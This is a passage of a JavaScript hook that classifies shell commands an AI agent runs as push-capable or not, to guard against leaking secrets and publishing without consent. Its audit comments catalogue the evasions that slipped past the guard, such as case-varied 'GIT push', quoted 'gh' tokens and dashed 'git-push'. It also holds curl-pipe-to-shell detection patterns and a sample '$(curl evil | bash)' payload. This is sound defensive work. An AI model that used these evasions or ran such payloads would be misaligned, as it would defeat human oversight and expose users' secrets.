      if (ch === '"') inDouble = false;
      continue;
    }
    if (ch === '\\' && i + 1 < s.length && s[i + 1] !== '\r' && s[i + 1] !== '\n') {
      out += s[i + 1];
      i++;
      continue;
    }
    if (ch === "'") {
      inSingle = true;
      out += ch;
      continue;
    }
    if (ch === '"') {
      inDouble = true;
      out += ch;
      continue;
    }
    out += ch;
  }
  return out;
}

// 2026-07-11 v2.0.1 follow-up fix (real deadlock, found live): the
// "script name contains deploy/release/publish/ship" indirection rule
// below correctly treats an arbitrary project script that might hide a
// push as push-capable — but `confirm-publish.mjs` and
// `confirm-go-public.mjs` themselves match it purely because their OWN
// filenames contain "publish"/"go-public", even though neither script
// pushes anything; each only writes a local marker file recording that
// the user already confirmed. That made gate.mjs deny the very script
// that RECORDS a confirmation on the grounds that "no confirmation is
// recorded yet" — a bootstrap deadlock with no way out, since the record
// can never be written.
//
// The exemption below is deliberately narrow — it strips at most one simple
// leading `cd ... &&`/`cd ...;` prefix, then requires NO compound operator
// anywhere in what remains (so nothing can be chained before or after), and
// only THEN checks that what's left is a plain `node <path-to-one-of-the-
// two-scripts> [one optional argument]` invocation. This is NOT a bare
// substring check: `git push origin main; node confirm-publish.mjs` still
// has a `;` left after stripping (there's no leading cd to strip, so the
// whole string is scanned for compound operators and the `;` is found) and
// is correctly NOT exempted — still caught by the checks below as a real
// push.
//
// 2026-07-11 Round 3 adversarial-audit fix (CRITICAL, found by independent
// verification, not trusted from the first report): the original version of
// this function matched the path with `\S.*(confirm-publish|confirm-go-
// public)\.mjs`, which is a SUFFIX/substring test, not an identity check —
// `node ./evil-confirm-publish.mjs` and `node /tmp/attacker/z-confirm-
// publish.mjs` both matched, because the literal text "confirm-publish.mjs"
// merely appears at the end of a longer, unrelated filename. Since
// isPushCapable() returning false makes BOTH gate.mjs and scan.mjs allow()
// immediately — skipping the secret scan and the publish-confirmation check
// entirely — this let any node script with a crafted filename run completely
// unchecked. The same over-broad match also had a second bug: a BARE
// invocation with no directory prefix at all (`node confirm-publish.mjs`,
// which is exactly the usage documented in that script's own header
// comment) failed the old regex, because `\S.*` required at least one
// character to exist strictly BEFORE the matched filename text — recreating,
// for that literal invocation form, the exact bootstrap deadlock this
// function was written to fix.
//
// Fixed by extracting the actual path argument and comparing its real
// `path.basename()` for an EXACT match against the two known script names,
// rather than testing whether the filename merely ends with that text. This
// closes both bugs: a bare `confirm-publish.mjs` has basename
// `confirm-publish.mjs` (exact match, exempted); `evil-confirm-publish.mjs`
// has basename `evil-confirm-publish.mjs` (not an exact match, NOT
// exempted, falls through to the ordinary push-capable checks below).
//
// Disclosed, not eliminated: this still trusts a FILENAME, not a
// cryptographic identity — a file deliberately created with the exact name
// `confirm-publish.mjs` in a location the session can reach would still be
// exempted, the same residual risk every filename-based check in this
// project carries (see SECURITY.md). Requiring the resolved path to also
// live under a fixed directory was considered and rejected: the legitimate
// invocation form varies by design (an absolute `${CLAUDE_PLUGIN_ROOT}/...`
// path from the plugin cache, or a relative `confirm-publish.mjs` from
// within the project root), so no single directory prefix covers every real
// use without also blocking it.
// 2026-07-11 Round 4 audit fix: the closing anchor only tolerated trailing
// [ \t], not a trailing newline — `node confirm-publish.mjs \n` (a trailing
// newline, plausible from how some shells/tools terminate a command) failed
// the match and fell through to the generic heuristic, misclassifying it as
// push-capable. Trailing `\r`/`\n` is now tolerated the same as spaces/tabs.
//
// 2026-07-11 Round 5 audit fix (two more found by execution, not reading):
// (1) the compound-operator check below tested the WHOLE string blind to
// quoting, so a project path containing a semicolon/pipe/backtick INSIDE
// quotes (`node confirm-publish.mjs "/Users/x/my;project"` — harmless,
// literal text once bash strips the quotes) bailed out and recreated the
// deadlock, even though nothing dangerous is actually there. Replaced with
// `hasLiveCompoundOperator`, a small quote-aware scanner: a `;`/`|`/`&&` is
// inert inside EITHER quote style in bash and is only flagged when
// unquoted; a backtick or `$(` remains live even inside double quotes (only
// single quotes fully neutralise them), so those are still flagged there.
// This is NOT a blanket "ignore anything in quotes" — that would have
// hidden a real `"$(curl evil | bash)"` payload, verified this scanner
// still catches that exact case before shipping.
// (2) the basename comparison was case-sensitive, while the filesystems
// this plugin actually runs on (macOS default APFS, Windows NTFS) are
// case-insensitive — `Confirm-Publish.mjs` IS the same file as
// `confirm-publish.mjs` there, but only got recognised as one via this
// exemption if the case matched exactly, misclassifying a same-file
// case-variant invocation as push-capable. Comparison is now
// case-insensitive to match how the filesystem actually treats the name.
function hasLiveCompoundOperator(s) {
  let inSingle = false;
  let inDouble = false;
  for (let i = 0; i < s.length; i++) {
    const ch = s[i];
    if (inSingle) {
      if (ch === "'") inSingle = false;
      continue;
    }
    if (inDouble) {
      if (ch === '"') {
        inDouble = false;
        continue;
      }
      if (ch === '`' || (ch === '$' && s[i + 1] === '(')) return true;
      continue;
    }
    if (ch === "'") {
      inSingle = true;
      continue;
    }
    if (ch === '"') {
      inDouble = true;
      continue;
    }
    if (ch === '`' || (ch === '$' && s[i + 1] === '(')) return true;
    if (ch === ';' || ch === '|') return true;
    if (ch === '&' && s[i + 1] === '&') return true;
  }
  return false;
}
function isConfirmScriptOnly(c) {
  const afterCd = c.replace(
    /^[ \t]*cd[ \t]+(?:"[^"]+"|'[^']+'|[^ \t;&|]+)[ \t]*(?:&&|;)[ \t]*/,
    '',
  );
  if (hasLiveCompoundOperator(afterCd)) return false;
  const m =
    /^node[ \t]+(?:"([^"]+)"|'([^']+)'|(\S+))(?:[ \t]+(?:"[^"]*"|'[^']*'|\S+))?[ \t\r\n]*$/.exec(
      afterCd,
    );
  if (!m) return false;
  const scriptPath = m[1] || m[2] || m[3];
  const base = path.basename(scriptPath).toLowerCase();
  // 2026-07-19: confirm-checkpoint.mjs joins the two confirm writers — its
  // filename contains no push keyword, but it is exempted here for the same
  // reason (it only writes a local marker file, never pushes), so running it to
  // RECORD a checkpoint authorisation is never itself mistaken for a push.
  //
  // **2026-08-18 (X229): ALL FOUR OF THESE FILES ARE GONE.** X214 deleted them on
  // 2026-08-16, so this exemption now names nothing that exists — dead code in a
  // security decision path, which is worth saying out loud rather than leaving to
  // be rediscovered. Kept rather than removed because two committed unit tests
  // (hooks.test.mjs, the 2026-07-11 Round 3 and Round 4 audit fixes) pin its exact
  // matching behaviour, and deleting a security function plus its tests is a wider
  // change than this finding warrants.
  //
  // NO BYPASS IS REACHABLE, verified rather than assumed: the regex above is
  // anchored to end-of-string and admits at most ONE further token, so a command
  // that also pushes can never match it. `node confirm-publish.mjs & git push …`
  // fails the anchor; `node confirm-publish.mjs &` matches but runs a file that
  // does not exist. Recorded as a disclosed residual in RESIDUALS.md.
  return (
    base === 'confirm-publish.mjs' ||
    base === 'confirm-go-public.mjs' ||
    base === 'confirm-checkpoint.mjs' ||
    base === 'confirm-memory-persist.mjs'
  );
}
// 2026-08-24, X5 / X6 / X15 — Phase 3, "escalate instead of guess".
//
// X15 is the architectural finding and it is correct: deciding what a shell command does by
// pattern-matching its TEXT cannot converge, and twelve audit rounds are the evidence. The proof sits
// in this very file. `isPushCapable` decides whether `npm run build` might publish by testing the
// command string against six words — SCRIPT_INDIRECTION_KEYWORDS = deploy|release|publish|ship|
// public|visibility. So `npm run deploy` is scanned and `npm run build` is not, on nothing but the
// name someone gave the script. Measured at HEAD: `bash build.sh`, `npm run build` and `make all` —
// the three commands X5 names — reach the network with no scan at all.
//
// Widening the word list is the move that has failed eleven times. You cannot enumerate what people
// call their scripts. THE ANSWER IS TO STOP GUESSING AND READ THE SCRIPT. That converges, because it
// replaces an unbounded guess about naming with a bounded fact about content.
//
// resolveScriptIndirection() takes a command and a working directory and returns the TEXT the command
// would actually run, for the three indirections that are resolvable from disk:
//
//   bash x.sh / sh x.sh / node x.mjs / python x.py / ./x.sh   ->  the file's contents
//   npm|pnpm|yarn run <name>                                  ->  package.json scripts[<name>]
//   make <target>                                             ->  that target's recipe lines
//
// The caller then applies the ordinary predicates to that text. A resolved script that does not push
// is silent, exactly as before, so this adds NO false alarms — which is the property that makes it
// safe to turn on. It is not a guess that might be wrong in either direction; it is the same question
// asked of the real content.
//
// DELIBERATE LIMITS, disclosed rather than hidden:
//   * ONE LEVEL. A script that runs another script is not followed. Recursion here would need a cycle
//     guard and a depth budget inside a PreToolUse hook, and the honest first version is bounded.
//   * Local files only, resolved against the command's own cwd, capped at MAX_RESOLVE_BYTES.
//   * No shell semantics. Variables, globs and conditionals inside the script are not evaluated; the
//     text is read, not interpreted. This finds a push that is written down. It does not find one
//     assembled at run time — and nothing that reads text ever will, which is X15 restated rather
//     than solved.
const MAX_RESOLVE_BYTES = 256 * 1024;

function readCapped(file) {
  try {
    const st = fs.statSync(file);
    if (!st.isFile() || st.size > MAX_RESOLVE_BYTES) return null;
    return fs.readFileSync(file, 'utf8');
  } catch {
    return null;
  }
}

export function resolveScriptIndirection(rawC, cwd) {
  if (!rawC || !cwd) return null;
  const c = normalizeForPushCheck(rawC);
  const base = String(cwd);

  // ---- an interpreter, or ./, invoked on a path -----------------------------------
  const direct = new RegExp(
    `(?:^|[^A-Za-z0-9_])(?:\\.\\/|(?:ba|z)?sh[ \\t]+|node[ \\t]+|python3?[ \\t]+|ruby[ \\t]+|perl[ \\t]+|source[ \\t]+|\\.[ \\t]+)([^ \\t;&|'"]+\\.(?:sh|bash|zsh|mjs|cjs|js|py|rb|pl))${LEXICAL_BOUNDARY}`,
    'i',
  ).exec(c);
  if (direct) {
    const rel = direct[1].replace(/^\.\//, '');
    const text = readCapped(path.resolve(base, rel));
    if (text !== null) return { kind: 'script', source: rel, text };
  }

  // ---- a file piped or redirected INTO an interpreter -----------------------------
  //
  // 2026-08-24, X6's local half. `cat x.sh | bash` and `bash < x.sh` run a local file just as surely
  // as `bash x.sh` does, and none of the three orders was modelled: all of `cat build.sh | bash`,
  // `cat build.sh|bash`, `bash < build.sh`, `bash <build.sh`, `< build.sh bash` and
  // `cat build.sh | sudo bash` reached the network unscanned.
  //
  // Unlike the direct form above, NO FILE EXTENSION IS REQUIRED here, and that is deliberate rather
  // than lax. `bash foo` is ambiguous — foo might be a subcommand — which is why the direct rule
  // wants an extension it recognises. `| bash` and `< ` followed by an interpreter are not ambiguous:
  // whatever that file holds is about to be executed, whatever it is called. A path that cannot be
  // read resolves to nothing and the caller is left exactly as it was.
  const INTERP = '(?:sudo[ \\t]+)?(?:(?:ba|z)?sh|node|python3?|ruby|perl)';
  const PATHCH = '([^ \\t;&|\'"<>]+)';
  for (const re of [
    // cat FILE | [sudo] interpreter
    new RegExp(
      `(?:^|[^A-Za-z0-9_])(?:cat|type)[ \\t]+${PATHCH}[ \\t]*\\|[ \\t]*${INTERP}${LEXICAL_BOUNDARY}`,
      'i',
    ),
    // interpreter < FILE
    new RegExp(`(?:^|[^A-Za-z0-9_])${INTERP}[ \\t]*<[ \\t]*${PATHCH}`, 'i'),
    // < FILE interpreter
    new RegExp(`(?:^|[^A-Za-z0-9_])<[ \\t]*${PATHCH}[ \\t]+${INTERP}${LEXICAL_BOUNDARY}`, 'i'),
  ]) {
    const hit = re.exec(c);
    if (!hit) continue;
    const rel = hit[1].replace(/^\.\//, '');
    const text = readCapped(path.resolve(base, rel));
    if (text !== null) return { kind: 'piped-script', source: rel, text };
  }

  // ---- a package.json script -----------------------------------------------------
  // 2026-08-24, X284: three spellings of the same thing were unmodelled, and the axis they sit on is
  // "the runner", which the X5/X6/X15 reproduction held constant at `npm`.
  //   * FLAGS BETWEEN `run` AND THE NAME — `npm run --silent build` is ordinary in CI output.
  //   * `yarn build` with no `run` at all. Yarn omits it; pnpm accepts both. So `pnpm run build`
  //     resolved and denied while `yarn build`, the same script by the same route, was silent.
  // Being permissive about the NAME is safe here and deliberately so: a name that is not a key in
  // `scripts` resolves to nothing and the caller is left exactly as it was, so `yarn install` and
  // `yarn add x` cost a failed lookup and nothing else.
  const run =
    /(?:^|[^A-Za-z0-9_])(?:npm|pnpm|yarn|bun)[ \t]+run[ \t]+(?:-{1,2}[A-Za-z0-9-]+[ \t]+)*([A-Za-z0-9_:.-]+)/i.exec(
      c,
    ) || /(?:^|[^A-Za-z0-9_])yarn[ \t]+(?:-{1,2}[A-Za-z0-9-]+[ \t]+)*([A-Za-z0-9_:.-]+)/i.exec(c);
  if (run) {
    const raw = readCapped(path.resolve(base, 'package.json'));
    if (raw !== null) {
      try {
        const pkg = JSON.parse(raw);
        const body = pkg && pkg.scripts && pkg.scripts[run[1]];
        if (typeof body === 'string') {
          return { kind: 'npm-script', source: `package.json scripts.${run[1]}`, text: body };
        }
      } catch {
        /* an unparseable package.json resolves to nothing, and the caller stays as it was */
      }
    }
  }

  // ---- a Makefile target ---------------------------------------------------------
  const mk = /(?:^|[^A-Za-z0-9_])make[ \t]+([A-Za-z0-9_.-]+)/i.exec(c);
  if (mk) {
    for (const name of ['Makefile', 'makefile', 'GNUmakefile']) {
      const raw = readCapped(path.resolve(base, name));
      if (raw === null) continue;
      // The recipe is the indented block following "<target>:". Tabs are the real delimiter, but
      // spaces are accepted too so a space-indented Makefile is not silently unresolvable.
      const lines = raw.split(/\r?\n/);
      const at = lines.findIndex((l) =>
        new RegExp(`^${mk[1].replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}[ \t]*:`).test(l),
      );
      if (at < 0) continue;
      const recipe = [];
      for (let i = at + 1; i < lines.length; i += 1) {
        if (/^[\t ]+\S/.test(lines[i])) recipe.push(lines[i].trim());
        else if (lines[i].trim() === '') continue;
        else break;
      }
      if (recipe.length)
        return { kind: 'make', source: `${name} target ${mk[1]}`, text: recipe.join('\n') };
    }
  }

  return null;
}

// resolveScriptChain() follows indirection TRANSITIVELY, to a bounded depth.
//
// 2026-08-24, X284. `resolveScriptIndirection()` follows exactly one hop, and one hop is not the
// shape of real deploy tooling: `deploy.sh` calls `build.sh`, `npm run release` calls `npm run push`.
// Measured at the parent, against a committed studio repo with a tracked AWS-shaped key:
//
//   bash build.sh    deny        (one hop — build.sh pushes directly)
//   bash outer.sh    NO DECISION  outer.sh is `bash build.sh`
//   npm run chain    NO DECISION  scripts.chain is `npm run build`
//   make chain       NO DECISION  the recipe is `bash build.sh`
//
// AND A MISS HERE IS NOT A WEAKER VERDICT. `isPushCapable` gates the whole content scan, so a command
// it does not recognise is not scanned at all — the staged key reaches the network with the hook
// silent. That is why depth mattered enough to find: the failure is total, not partial.
//
// This was DISCLOSED, which is the part worth being honest about. X15's row said "one level only (a
// script that runs another script is not followed)" and SECURITY.md said the same. A disclosed
// limitation is better than a hidden one and it is not a substitute for the fix when the fix is
// eleven lines and the pattern for it was already in the same file — `unwrapShellText` has bounded
// itself at three levels since X227, for exactly this reason and with exactly this reasoning.
//
// THE BOUND IS A REAL LIMIT, NOT A CLAIM OF COMPLETENESS. Three hops, and a chain longer than that
// is followed as far as three and no further; a four-deep chain that only pushes at the fourth hop
// is still missed, and that is the residual, disclosed here and in SECURITY.md rather than implied
// to be closed. `seen` stops a script that runs itself from spinning — the ordinary shape being a
// Makefile target that calls `make` again — and it is keyed on the resolved SOURCE, not the text, so
// two different files holding identical content are still two hops.
export function resolveScriptChain(rawC, cwd, maxDepth = 3) {
  const seen = new Set();
  const chain = [];
  let text = rawC;
  for (let d = 0; d < maxDepth; d += 1) {
    const hop = resolveScriptIndirection(text, cwd);
    if (hop === null) break;
    const key = `${hop.kind}:${hop.source}`;
    if (seen.has(key)) break;
    seen.add(key);
    chain.push(hop);
    // Stop at the first hop that answers the question. Going deeper could only find a second reason
    // for the same decision, and the caller reports the chain it actually followed.
    if (isPushCapable(hop.text)) break;
    text = hop.text;
  }
  if (!chain.length) return null;
  const last = chain[chain.length - 1];
  // The source names EVERY hop, because a refusal that says "build.sh pushes" when the user typed
  // `bash outer.sh` is a refusal they cannot act on. The chain is what they need to see.
  return {
    kind: last.kind,
    source: chain.map((h) => h.source).join(' → '),
    text: last.text,
    depth: chain.length,
  };
}

// updateRootIsOurs() — the two-part test that establishes the git repository above this plugin IS
// this plugin's, before anything is fetched or rebased.
//
// 2026-08-24, X292. This logic lived inline in `auto-update.mjs`, and X241's reproduction — the
// CRITICAL finding about the nightly unattended updater rebasing a stranger's repository — said so
// outright: "the guard, re-implemented here from the two properties it asserts rather than by
// importing the module". All five of its cases called that local eight-line copy, and the SHIPPED
// guard was touched only by four substring tests over the file's text.
//
// So `!crossesNodeModules && carriesThisPlugin` becoming `||`, or the boolean inverted, or
// `relFromRoot` computed from the wrong pair of paths, would keep every substring present and all five
// cases green while the updater rebased the user's Homebrew prefix again. The two copies agreed on the
// day this was found; nothing in the file could have told anyone if they stopped.
//
// The fix is not a cleverer test, it is ONE implementation. `auto-update.mjs` calls this and the
// reproduction imports this, so there is no second copy to drift. That is L14 in this project: sites
// that each carry their own copy of a rule are sites that drift.
//
// THE TWO PROPERTIES, and why each is needed:
//   * the path from the repository root down to the hook must not cross `node_modules` — if it does,
//     this plugin is a DEPENDENCY of the repository above it, and that repository is someone else's;
//   * the repository must actually carry this plugin's manifest, in either of the two layouts that
//     are legitimate (a source checkout, or a marketplace tree with the plugin under `plugins/`).
export function updateRootIsOurs(hookDir, studioRoot, exists) {
  const stat = typeof exists === 'function' ? exists : (p) => fs.existsSync(p);
  const relFromRoot = path.relative(String(studioRoot), String(hookDir));
  const crossesNodeModules = relFromRoot.split(path.sep).some((seg) => seg === 'node_modules');
  const carriesThisPlugin =
    stat(path.join(String(studioRoot), '.claude-plugin', 'plugin.json')) ||
    stat(
      path.join(String(studioRoot), 'plugins', 'gru953-studio', '.claude-plugin', 'plugin.json'),
    );
  return !crossesNodeModules && carriesThisPlugin;
}

// 2026-08-24, X6. The half of X6 that CANNOT be resolved, and therefore the one place where the
// ratified architecture — "fail closed to ask on anything the tool cannot classify" — is the only
// honest answer.
//
// `curl https://… | sh` runs code that does not exist on this machine until the moment it runs. No
// amount of reading finds it. Measured at HEAD, both `cat s.sh | bash` and `curl -s … | sh` are
// classified non-push and reach the network with no scan: the pipe form was never modelled.
//
// The local pipe (`cat s.sh | bash`) IS resolvable, and as of 2026-08-24 it is resolved — see the
// piped-script form in resolveScriptIndirection above. This function covers only the case that can
// never be resolved by anything, where asking costs almost nothing because fetching a script and
// executing it unread is both rare in ordinary work and the exact idiom no amount of reading checks.
// Keeping the rule this narrow is deliberate: an ask on every pipeline would be the false alarm that
// gets a guard switched off (L5), and there is no version of that which is worth having.
export function pipesRemoteCodeIntoAnInterpreter(rawC) {
  if (!rawC) return false;
  const c = normalizeForPushCheck(rawC);
  const FETCH = /(?:^|[^A-Za-z0-9_])(?:curl|wget|fetch|http|https)(?:[ \t]|$)/i;
  const INTERP = /\|[ \t]*(?:sudo[ \t]+)?(?:(?:ba|z)?sh|node|python3?|ruby|perl)(?:[ \t]|;|$)/i;
  if (!INTERP.test(c)) return false;
  // The fetch must be on the LEFT of the pipe that feeds the interpreter, so `sh -c "curl …"` and a
  // command that merely mentions curl after the pipe are not swept in.
  const at = c.search(INTERP);
  return FETCH.test(c.slice(0, at < 0 ? c.length : at));
}

// 2026-08-23, X272. A NARROW companion to isPushCapable below, for exactly one purpose: deciding
// whether a command actually SENDS COMMITS TO A REMOTE, so scan.mjs can ask for the publishing
// consent the operating charter requires.
//
// These have to be two separate predicates, and conflating them was a real defect — caught by
// X214's own controls, not by review. `isPushCapable` answers a different question: "might this
// touch publishing, so should I SCAN it?" It is deliberately WIDE, and returns true for
// `gh repo clone` (read-only) and for `node scripts/build.mjs --outdir public`. Erring wide is
// correct there: scan more, not less. It is badly wrong for consent. X272's first attempt escalated
// on isPushCapable, so a read-only clone raised a prompt asserting "this command sends code out of
// your machine" — false, on a command that publishes nothing. That is this project's L5: a gate that
// cries wolf gets routed around, and a routed-around gate is worse than no gate.
//
// SCOPE, stated rather than left implicit. This covers pushing commits to a remote, in every form
// the wide classifier already recognises (spaced, quoted, case-varied, send-pack, and the dashed
// builtins X179 added). It deliberately does NOT cover the `gh` publishing family — `gh release
// create`, `gh repo create`, `gh repo edit --visibility public`. Those genuinely do publish, and in
// `auto` mode they still raise no prompt: that is a DISCLOSED GAP filed with this finding, not an
// oversight. Inventing a gh subcommand taxonomy here would mean guessing which ones are outbound
// with no reproduction to bound the guess, which is precisely how the clone and build-script cases
// broke. It is a decision for the owner, with evidence, rather than a silent widening.
export function sendsCommitsToRemote(rawC) {
  if (!rawC) return true;
  // Unanalysable, therefore unclassifiable. The ratified permission architecture is "fail closed to
  // `ask` on anything the tool cannot classify" — and this predicate's only caller IS the ask.
  if (exceedsAssignmentBound(rawC)) return true;
  const c = normalizeForPushCheck(rawC);
  if (isConfirmScriptOnly(c)) return false;
  return (
    new RegExp(
      `(^|[^A-Za-z0-9_])['"]?git['"]?(?:[ \\t]+[^ \\t]+)*?[ \\t]+['"]?push['"]?${LEXICAL_BOUNDARY}`,
      'i',
    ).test(c) ||
    new RegExp(`(^|[^A-Za-z0-9_])git[ \\t]+send-pack${LEXICAL_BOUNDARY}`, 'i').test(c) ||
    new RegExp(`(^|[^A-Za-z0-9_./\\\\-])git-(push|send-pack)${DASHED_BOUNDARY}`, 'i').test(c) ||
    new RegExp(`[/\\\\]git-(push|send-pack)${DASHED_BOUNDARY}`, 'i').test(c)
  );
}

export function isPushCapable(rawC) {
  if (!rawC) return true;
  // 2026-08-07 audit fix. Past MAX_RESOLVED_ASSIGNMENTS the variable resolution
  // is skipped (see normalizeForPushCheck), so any `$VAR` in this command is
  // unresolved text and this matcher cannot prove the command is NOT a push.
  // This function's own stated rule is "prove non-push or treat as push", so
  // the answer here is true. **Corrected 2026-08-18 (X229):** this said the answer
  // "routes the command to gate.mjs's authorisation check rather than allowing it
  // outright" — a present-tense claim about a hook X214 removed on 2026-08-16.
  // There is no authorisation check; `true` routes it to `scan.mjs`'s secret and
  // private-memory scan, which is the whole of push safety now.
  if (exceedsAssignmentBound(rawC)) return true;
  const c = normalizeForPushCheck(rawC);
  if (isConfirmScriptOnly(c)) return false;
  // 2026-07-11 Round-A adversarial-audit fix: tolerate quotes around the
  // git binary or the `push` subcommand. `git "push"`, `git 'push'` and
  // `"git" push` all run a real push once the shell strips the quotes, but
  // the un-quoted matcher rated them NON-push — a fail-OPEN bypass that
  // contradicted this matcher's own "prove non-push or treat as push" rule.
  // Optional `['"]?` around `git` and `push` closes it; a battery in
  // hooks.test.mjs locks it in, and the safe-command set was re-verified to
  // confirm no new false positives (gitk/github/xgit/`git pushx` stay clear).
  //
  // 2026-07-11 Round 8 audit fix (CRITICAL, the most severe bypass found in
  // this whole loop): every regex in this function matched `git`/`gh`/
  // `push`/`repo`/etc. as literal, case-SENSITIVE text. But on the
  // case-insensitive filesystems this plugin actually targets (macOS APFS,
  // Windows NTFS — already the reason the confirm-script basename check
  // above is case-insensitive), `PATH` lookup for a binary name is ALSO
  // case-insensitive: `GIT push origin main` and `GH repo edit me/app
  // --visibility public` are not obfuscation, bash runs them as the REAL
  // git/gh binaries, completely unchanged, because `GIT`/`GH` resolve to
  // the same executable as `git`/`gh`. Reproduced live: `bash -c 'GIT
  // --version'` prints the real git version; `isPushCapable('GIT push
  // origin main')` returned `false` (should be `true`); with a real AWS-
  // shaped secret committed and ZERO confirmation tokens recorded,
  // `GIT push origin main` was `allow`ed by both `scan.mjs` and `gate.mjs`
  // while lowercase `git push origin main` was correctly denied — proving
  // it was the casing, not a broken test. Added `/i` to every regex in this
  // function and in `isGoPublicCommand` (gate.mjs) that matches a binary
  // name, subcommand, or keyword — matching the same `/i` this project
  // already added to the script-extension check and the confirm-script
  // basename comparison, for the identical reason.
  // 2026-07-21 audit fix (ReDoS — catastrophic backtracking): the token
  // repetition between `git` and `push` was `([ \t]+-[^ \t]+|[ \t]+[^ \t]+)*` —
  // two FULLY OVERLAPPING alternatives (a dash-prefixed token matches BOTH
  // branches), so `(A|B)*` over n tokens with no trailing `push` explored 2^n
  // backtracking paths. This regex runs on EVERY Bash/PowerShell/Monitor command,
  // so a flag-heavy but non-push `git` command (e.g. `git log` with ~26 `--flags`)
  // hung the PreToolUse hook for 15+ seconds (measured: n=28 -> 22s, doubling per
  // token), and a pathological input could push the hook past the harness timeout.
  // The `-flag` branch is fully subsumed by the general `[ \t]+[^ \t]+` branch, so
  // a single lazy token repetition matches exactly the same commands with no
  // exponential blowup (verified: evil n=60 -> ~0ms; `git push`, `git -c a=b push`,
  // `GIT push`, `git "push"` still match; `git pushx`, `git status`, `git log
  // --all` still do not).
  if (
    new RegExp(
      `(^|[^A-Za-z0-9_])['"]?git['"]?(?:[ \\t]+[^ \\t]+)*?[ \\t]+['"]?push['"]?${LEXICAL_BOUNDARY}`,
      'i',
    ).test(c)
  )
    return true;
  // 2026-07-11 Round 5 audit fix (CRITICAL, found live via gate.mjs's real
  // isGoPublicCommand()): every `gh ...` regex below required the literal,
  // unquoted text "gh" — `"gh" repo edit ...` or `gh "repo" "edit" ...`
  // wasn't just missed by isGoPublicCommand's own (now-fixed) matcher, it
  // was missed by isPushCapable ITSELF, so the command never even reached
  // isGoPublicCommand — gate.mjs's first check (`if (!isPushCapable(CMD))
  // allow()`) exited early and let a quoted-token `gh repo edit --visibility
  // public` straight through with no confirmation of any kind. The git-push
  // regex above already tolerated quotes around `git`/`push` (Round A); the
  // gh regexes never got the same treatment. Added `['"]?` around every gh
  // token and sub-token.
  if (
    /(^|[^A-Za-z0-9_])['"]?gh['"]?[ \t]+(['"]?repo['"]?[ \t]+['"]?(create|edit|sync|clone)['"]?|['"]?pr['"]?[ \t]+['"]?create['"]?|['"]?release['"]?[ \t]+['"]?(create|upload)['"]?|['"]?gist['"]?[ \t]+['"]?create['"]?)/i.test(
      c,
    )
  )
    return true;
  if (
    new RegExp(`(^|[^A-Za-z0-9_])['"]?gh['"]?[ \\t].*--push['"]?${LEXICAL_BOUNDARY}`, 'i').test(c)
  )
    return true;
  // 2026-07-21 audit fix (undisclosed bypass of BOTH gates): `gh api` is the
  // GitHub CLI's raw REST interface — a documented, non-obfuscated way to create
  // repos, change a repo's visibility, push refs, etc., i.e. everything these
  // gates control. It was not detected at all, so `gh api -X PATCH repos/me/app
  // -f visibility=public` (and `-f private=false`, `-X POST /user/repos ...`)
  // short-circuited at gate.mjs's `if (!isPushCapable(CMD)) allow()` before the
  // go-public gate ever ran. Same class as the `git send-pack` plumbing
  // alternative already covered above. A READ (GET, the default — e.g. the
  // studio's own `gh api user`) stays ALLOWED; only a WRITE is push-capable,
  // signalled by an explicit write method (`-X`/`--method` POST|PATCH|PUT|DELETE)
  // or by any request-body flag (`-f`/`-F`/`--field`/`--raw-field`/`--input`),
  // which `gh api` uses only to send a body. (Residual, disclosed in SECURITY.md:
  // a visibility change whose value lives only inside an `--input` file, and a raw
  // `curl` to api.github.com, are not parsed here — the same "this hook does not
  // execute or read referenced files" boundary as elsewhere.)
  if (
    /(^|[^A-Za-z0-9_])['"]?gh['"]?[ \t]+['"]?api['"]?([ \t]|$)/i.test(c) &&
    (/[ \t]['"]?(-X|--method)['"]?[ \t=]+['"]?(POST|PATCH|PUT|DELETE)['"]?/i.test(c) ||
      /[ \t](--field|--raw-field|--input)[ \t=]/i.test(c) ||
      // 2026-07-21 Round 2 fix: the earlier body-flag test required a separator
      // right after -f/-F, so it missed pflag's standard ATTACHED-shorthand form
      // `-fname=x` / `-Fname=x` (value glued to the flag) — a normal, documented
      // gh api form, not obfuscation, that carries a POST body and so bypassed
      // both gates. Match -f/-F followed by a separator OR immediately by a
      // non-dash value character. Over-detection fails closed, so it is safe.
      /[ \t]-[fF]([ \t=]|[^ \t-])/i.test(c))
  )
    return true;
  // git aliases that resolve to push (e.g. `git -c alias.p=push p`, or
  // `git config alias.foo push` followed later by `git foo`).
  if (/(^|[^A-Za-z0-9_])git[ \t]+(-c[ \t]+)?alias\.[A-Za-z0-9_.-]+[ \t]*=[ \t]*['"]?push/i.test(c))
    return true;
  if (
    /(^|[^A-Za-z0-9_])git[ \t]+config([ \t]+--\S+)*[ \t]+alias\.[A-Za-z0-9_.-]+[ \t]+['"]?push/i.test(
      c,
    )
  )
    return true;
  // git plumbing command that performs a push without the word "push".
  // 2026-08-22, X179: git's DASHED BUILTIN form. `git-push` and `git-send-pack` are real
  // executables in `$(git --exec-path)` — on the machine this was found on both are symlinks to
  // `git` — and they perform the push without the words `git push` ever appearing. So
  // `isPushCapable` returned FALSE and the secret scan was skipped ENTIRELY, not downgraded: a
  // fixture carrying a tracked `AKIA…`-shaped key and a non-gitignored `Dev-Memory/` got `deny` for
  // `git push origin main` and NO DECISION for the absolute libexec path, `$(git --exec-path)/git-push`,
  // a PATH-prefix form, `git-send-pack`, `--force`, and the bare name.
  //
  // This is NOT the text-obfuscation class disclosed in SECURITY.md. The command literally reads
  // `git-push`; nothing is hidden or encoded. It is a documented invocation form the classifier had
  // never modelled.
  //
  // The boundary matters: a longer hyphenated name like `git-push-helper` is a DIFFERENT program and
  // must stay uncaught, or an ordinary install script gets swept up and the guard becomes the L5
  // kind that gets switched off. Verified both ways.
  //
  // `(?![A-Za-z0-9_-])` rather than LEXICAL_BOUNDARY, because LEXICAL_BOUNDARY permits a following
  // HYPHEN — so `git-push-helper` matched on the first run of this rule's own control. A hyphen
  // continues the program name, so it has to end the match.
  const DASHED_END = DASHED_BOUNDARY; // X272: one definition, at module scope
  if (
    new RegExp(`(^|[^A-Za-z0-9_./\\\\-])git-(push|send-pack)${DASHED_END}`, 'i').test(c) ||
    new RegExp(`[/\\\\]git-(push|send-pack)${DASHED_END}`, 'i').test(c)
  )
    return true;
  if (new RegExp(`(^|[^A-Za-z0-9_])git[ \\t]+send-pack${LEXICAL_BOUNDARY}`, 'i').test(c))
    return true;
  // gh's own alias mechanism, same shape of risk as git aliases.
